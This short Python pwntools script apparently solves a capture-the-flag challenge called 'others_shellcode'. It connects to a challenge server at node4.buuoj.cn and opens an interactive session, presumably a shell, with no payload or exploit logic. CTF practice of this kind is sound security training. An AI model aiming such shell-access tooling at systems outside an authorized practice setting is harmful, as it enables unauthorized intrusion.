from pwn import *


def others_shellcode(file_name=''):
    print('others_shellcode start')
    target = remote('node4.buuoj.cn', 27827)

    target.interactive()
    print('others_shellcode end')


if __name__ == '__main__':
    others_shellcode()
